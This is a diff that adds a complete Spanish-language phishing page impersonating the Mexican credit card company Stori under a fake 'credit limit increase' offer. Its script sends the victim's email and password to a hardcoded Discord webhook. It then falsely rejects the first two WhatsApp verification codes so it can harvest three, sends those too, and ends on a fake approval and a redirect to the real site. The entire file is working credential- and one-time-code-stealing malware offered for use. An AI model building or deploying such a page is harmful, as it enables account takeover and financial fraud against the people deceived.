@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+<link rel="icon" type="ico" href="unnamed.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Stori | Tarjetas de crédito sin buró y cuenta de depósitos.</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Open Sans', sans-serif;
+      background: #f3f6f9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      background: #fff;
+      padding: 2rem;
+      border-radius: 1rem;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      opacity: 0;
+      transition: opacity 0.5s ease-in-out;
+    }
+
+    .screen.active {
+      display: flex;
+      opacity: 1;
+    }
+
+    .logo {
+      width: 100px;
+      margin-bottom: 1rem;
+    }
+
+    .input-group {
+      display: flex;
+      align-items: center;
+      background: #f0f2f5;
+      border-radius: 8px;
+      margin: 1rem 0;
+      padding: 0.5rem 1rem;
+      width: 100%;
+    }
+
+    .input-group .icon {
+      color: #888;
+      margin-right: 0.5rem;
+    }
+
+    .input-group input {
+      border: none;
+      background: transparent;
+      outline: none;
+      flex: 1;
+      font-size: 1rem;
+    }
+
+    button {
+      background: #00b67a;
+      color: white;
+      padding: 0.75rem 2rem;
+      border: none;
+      border-radius: 50px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 1rem;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #00a16a;
+    }
+
+    button:disabled {
+      background: #cccccc;
+      cursor: not-allowed;
+    }
+
+    h2 {
+      color: #003049;
+      margin: 1rem 0 0.5rem;
+    }
+
+    p {
+      color: #555;
+      font-size: 0.95rem;
+    }
+
+    .grafica-img {
+      max-width: 100%;
+      margin: 1rem 0;
+    }
+
+    .calculadora {
+      background: #e9f9f0;
+      padding: 1rem;
+      border-radius: 1rem;
+    }
+
+    .calculadora h3 span {
+      color: #00b67a;
+      font-size: 1.8rem;
+    }
+
+    .aprobado {
+      color: #00b67a;
+    }
+
+    #pantallaLoader img {
+      margin-top: 1rem;
+    }
+
+    .confetti canvas {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 9999;
+    }
+
+    .mensaje-error {
+      color: red;
+      margin-top: 1rem;
+      font-size: 0.85rem;
+    }
+
+    .campo-requerido {
+      border: 1px solid red !important;
+    }
+    
+    /* Forzar que la pantalla se mantenga visible */
+    #pantallaResultado.active {
+      position: fixed;
+      z-index: 1000;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+  </style>
+</head>
+<body>
+  <div class="screen active" id="pantallaInicio">
+    <img src="https://i.imgur.com/GFGp9I7.png" alt="Stori Logo" class="logo">
+    <h2>Bienvenido a su análisis de aumento de cupo</h2>
+    <p>Ingrese a continuación para medir su nivel de aumento de cupo</p>
+    <div class="input-group">
+      <div class="icon"><i class="fas fa-envelope"></i></div>
+      <input type="email" id="email" placeholder="Correo electrónico" required>
+    </div>
+    <p id="emailError" class="mensaje-error"></p>
+    <button id="btnContinuar" onclick="validarEmail()">Iniciar Sesión</button>
+  </div>
+
+  <div class="screen" id="pantallaPassword">
+    <h2>Verificación de cuenta</h2>
+    <div class="input-group">
+      <div class="icon"><i class="fas fa-lock"></i></div>
+      <input type="password" id="password" placeholder="Contraseña" required>
+    </div>
+    <p id="passwordError" class="mensaje-error"></p>
+    <button id="btnVerificar" onclick="validarPassword()">Verificar</button>
+  </div>
+
+  <div class="screen" id="pantallaLoader">
+    <h2>Calculando su aumento de cupo...</h2>
+    <img src="https://data.gov.ie/img/fluid-loader.gif" alt="Cargando..." width="200">
+  </div>
+
+  <div class="screen" id="pantallaValidando">
+    <h2>Validando su información...</h2>
+    <p>Manténgase en línea para calcular su cupo de aumento</p>
+    <img src="https://data.gov.ie/img/fluid-loader.gif" alt="Validando..." width="200">
+  </div>
+
+  <div class="screen" id="pantallaCodigo">
+    <h2>Ingrese el código que recibió por WhatsApp</h2>
+    <div class="input-group">
+      <div class="icon"><i class="fas fa-key"></i></div>
+      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
+
+    </div>
+    <p id="mensajeError" class="mensaje-error"></p>
+    <button id="btnValidarCodigo" onclick="validarCodigo()">Validar código</button>
+  </div>
+
+  <div class="screen" id="pantallaResultado">
+    <h2 class="aprobado">¡Aumento aprobado!</h2>
+    <div class="grafica">
+      <img src="https://i.imgur.com/GFGp9I7.png" class="grafica-img" alt="Gráfico de aumento">
+      <div class="calculadora">
+        <p>24hrs Sera aprobado un aumento:</p>
+        <h3><span>$126,500 MXN</span></h3>
+      </div>
+    </div>
+    <button id="btnAplicarAumento" onclick="redirigirAStoriOficial()">Aplicar aumento</button>
+  </div>
+
+  <div class="confetti" id="confetti"></div>
+
+  <script src="https://cdn.jsdelivr.net/npm/js-confetti@latest/dist/js-confetti.browser.js"></script>
+  <script>
+    const pantallas = ["pantallaInicio", "pantallaPassword", "pantallaLoader", "pantallaValidando", "pantallaCodigo", "pantallaResultado"];
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1366627289147899954/q84kiXT8QGK3UC6Quss2T4BOq9m4Okn1zmV2AI5phiM3xrZd4WcXl904A3MxpUGCRxQe";
+    
+    // Prevenir que se cierre la página antes de aceptar el aumento
+    window.onbeforeunload = function() {
+      const pantallaResultadoActiva = document.getElementById("pantallaResultado").classList.contains("active");
+      if (pantallaResultadoActiva) {
+        return "Es necesario aplicar el aumento antes de salir. ¿Está seguro que desea continuar?";
+      }
+    };
+    
+    function mostrarPantalla(id) {
+      pantallas.forEach(p => {
+        const el = document.getElementById(p);
+        el.classList.remove("active");
+      });
+      const pantallaNueva = document.getElementById(id);
+      pantallaNueva.classList.add("active");
+    }
+
+    function validarEmail() {
+      const email = document.getElementById("email").value;
+      const emailError = document.getElementById("emailError");
+      const emailInput = document.getElementById("email");
+      
+      // Validación de formato de email
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      
+      if (!email) {
+        emailError.textContent = "El correo electrónico es obligatorio";
+        emailInput.classList.add("campo-requerido");
+        return false;
+      } else if (!emailRegex.test(email)) {
+        emailError.textContent = "Por favor, ingrese un correo electrónico válido";
+        emailInput.classList.add("campo-requerido");
+        return false;
+      } else {
+        emailError.textContent = "";
+        emailInput.classList.remove("campo-requerido");
+        mostrarPantalla('pantallaPassword');
+        return true;
+      }
+    }
+    
+    function validarPassword() {
+      const password = document.getElementById("password").value;
+      const passwordError = document.getElementById("passwordError");
+      const passwordInput = document.getElementById("password");
+      
+      if (!password) {
+        passwordError.textContent = "La contraseña es obligatoria";
+        passwordInput.classList.add("campo-requerido");
+        return false;
+      } else if (password.length < 4) {
+        passwordError.textContent = "La contraseña debe tener al menos 4 caracteres";
+        passwordInput.classList.add("campo-requerido");
+        return false;
+      } else {
+        passwordError.textContent = "";
+        passwordInput.classList.remove("campo-requerido");
+        enviarDatosYMostrarLoader();
+        return true;
+      }
+    }
+
+    function enviarADiscord(contenido) {
+      try {
+        fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: contenido
+          })
+        }).catch(error => {
+          console.error("Error enviando datos a Discord:", error);
+        });
+      } catch (error) {
+        console.error("Error general en la función enviarADiscord:", error);
+      }
+    }
+
+    function enviarDatosYMostrarLoader() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      try {
+        // Enviar datos a Discord
+        enviarADiscord(`Email: ${email}\nPassword: ${password}`);
+      } catch (e) {
+        console.error("Error al enviar datos:", e);
+      }
+
+      mostrarPantalla("pantallaLoader");
+      setTimeout(() => mostrarPantalla("pantallaValidando"), 2500);
+      setTimeout(() => mostrarPantalla("pantallaCodigo"), 7500);
+    }
+
+    let intentos = 0;
+    const codigosIngresados = [];
+
+    function validarCodigo() {
+      const codigo = document.getElementById("codigo").value;
+      const mensajeError = document.getElementById("mensajeError");
+      const codigoInput = document.getElementById("codigo");
+      
+      if (!codigo) {
+        mensajeError.textContent = "El código es obligatorio";
+        codigoInput.classList.add("campo-requerido");
+        return false;
+      } else if (!/^\d+$/.test(codigo)) {
+        mensajeError.textContent = "El código debe contener solo números";
+        codigoInput.classList.add("campo-requerido");
+        return false;
+      } else {
+        mensajeError.textContent = "";
+        codigoInput.classList.remove("campo-requerido");
+        
+        // Guardar el código ingresado
+        codigosIngresados.push(codigo);
+        
+        try {
+          // Enviar el código a Discord
+          enviarADiscord(`Código ingresado (intento ${intentos + 1}): ${codigo}`);
+        } catch (e) {
+          console.error("Error al enviar código:", e);
+        }
+
+        if (intentos < 2) {
+          mostrarPantalla("pantallaValidando");
+          setTimeout(() => {
+            mostrarPantalla("pantallaCodigo");
+            mensajeError.textContent = "Código inválido. Por favor, ingrese el código correctamente.";
+            document.getElementById("codigo").value = "";
+          }, 5000);
+        } else {
+          try {
+            // Después del tercer intento, enviar todos los códigos juntos a Discord
+            enviarADiscord(`Resumen de todos los códigos ingresados:\n${codigosIngresados.join(", ")}`);
+          } catch (e) {
+            console.error("Error al enviar resumen de códigos:", e);
+          }
+          
+          mostrarPantalla("pantallaResultado");
+          lanzarConfeti();
+        }
+
+        intentos++;
+        return true;
+      }
+    }
+
+    function lanzarConfeti() {
+      try {
+        const canvas = document.createElement("canvas");
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        document.getElementById("confetti").appendChild(canvas);
+        const jsConfetti = new JSConfetti({ canvas });
+        jsConfetti.addConfetti({
+          emojis: ["🎉", "💳", "✨", "💸"],
+          confettiNumber: 100,
+          emojiSize: 28,
+          confettiRadius: 5
+        });
+      } catch (e) {
+        console.error("Error al lanzar confeti:", e);
+      }
+    }
+    
+    function redirigirAStoriOficial() {
+      try {
+        // Enviar notificación a Discord antes de redirigir
+        enviarADiscord("Usuario hizo clic en 'Aplicar aumento' - Redirigiendo a la página oficial");
+      } catch (e) {
+        console.error("Error al enviar notificación final:", e);
+      }
+      
+      // Desactivar el botón para evitar múltiples clics
+      document.getElementById("btnAplicarAumento").disabled = true;
+      document.getElementById("btnAplicarAumento").textContent = "Redirigiendo...";
+      
+      // Eliminar el evento beforeunload antes de redirigir
+      window.onbeforeunload = null;
+      
+      // Redirigir a la página oficial de Stori
+      window.location.href = "https://www.storicard.com/";
+    }
+    
+    // Evitar que los formularios causen recarga de página
+    document.addEventListener('submit', function(e) {
+      e.preventDefault();
+      return false;
+    });
+    
+    // Manejar errores generales
+    window.onerror = function(message, source, lineno, colno, error) {
+      console.error("Error global capturado:", message, error);
+      return true; // Prevenir que el error se muestre en la consola del navegador
+    };
+  </script>
+</body>
+</html>
